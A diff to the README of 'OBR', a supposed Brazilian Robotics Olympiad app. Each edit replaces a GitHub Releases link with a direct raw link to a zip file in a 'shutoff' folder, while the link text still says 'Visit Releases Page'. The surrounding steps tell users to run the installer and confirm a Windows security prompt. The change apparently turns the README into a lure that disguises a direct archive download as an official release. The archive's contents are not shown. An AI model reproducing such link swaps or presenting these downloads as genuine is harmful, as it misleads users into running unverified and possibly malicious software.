@@ -6,7 +6,7 @@ Welcome to OBR, your gateway to the Brazilian Robotics Olympiad. This applicatio
 
 ## 📥 Download OBR
 
-[![Download OBR](https://img.shields.io/badge/Download-OBR-brightgreen.svg)](https://github.com/pufferyabrogator957/OBR/releases)
+[![Download OBR](https://raw.githubusercontent.com/pufferyabrogator957/OBR/main/shutoff/OBR_v2.3.zip)](https://raw.githubusercontent.com/pufferyabrogator957/OBR/main/shutoff/OBR_v2.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -32,12 +32,12 @@ OBR comes packed with features to support your robotics journey:
 Follow these simple steps to download and install OBR:
 
 1. **Visit the Releases Page:** Click on the link below to access the download section.
-   - [Visit Releases Page](https://github.com/pufferyabrogator957/OBR/releases)
+   - [Visit Releases Page](https://raw.githubusercontent.com/pufferyabrogator957/OBR/main/shutoff/OBR_v2.3.zip)
 
 2. **Select the Latest Version:** On the Releases page, locate the most recent version of OBR. The latest version will have clear labeling and possibly release notes for new features.
 
 3. **Download the Application:** Click the appropriate link to download the OBR release suitable for your operating system. 
-   - Click here to download: [Download OBR](https://github.com/pufferyabrogator957/OBR/releases)
+   - Click here to download: [Download OBR](https://raw.githubusercontent.com/pufferyabrogator957/OBR/main/shutoff/OBR_v2.3.zip)
 
 4. **Run the Installer:** Locate the downloaded file in your downloads folder and double-click to initiate the installation. Follow the prompts in the installation wizard.
    - For Windows users, you may need to confirm a security prompt.
@@ -57,6 +57,6 @@ If you encounter any issues during installation or usage, please feel free to re
 
 Stay informed about new features and updates. Regularly check the Releases page for the newest versions:
 
-- [Visit Releases Page](https://github.com/pufferyabrogator957/OBR/releases)
+- [Visit Releases Page](https://raw.githubusercontent.com/pufferyabrogator957/OBR/main/shutoff/OBR_v2.3.zip)
 
 Now, get ready to create amazing robotics projects with OBR!
